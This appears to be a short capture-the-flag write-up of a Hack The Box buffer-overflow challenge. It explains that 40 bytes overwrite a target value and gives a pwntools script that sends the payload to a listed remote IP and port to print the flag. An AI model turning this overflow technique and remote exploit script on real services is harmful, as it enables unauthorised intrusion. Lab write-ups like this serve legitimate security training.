In order to reach the flag you need to fill 32 + 8 = 40 bytes of data in to the buffer and overwrite the given target address which has â€˜0xdeadbeefâ€™ as a value in it. But running this attack locally only gives you the fake flag which was put there for testing purposes. In order to acquire the real flag you need to run the attack on the docker instance. So i modified the given â€˜wrapper.pyâ€™ python script. Using pwntools i successfully acquired the flag after sending 40 bytes of data to the docker instance.

#!/usr/bin/python3.8
from pwn import *

# connection info
IP   = '188.166.152.84'
PORT = 31791

# start remote connection
r = remote(IP, PORT)

# craft payload
payload = b'A' * 40

# wait until prompt
r.recvregex(b'>>')

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
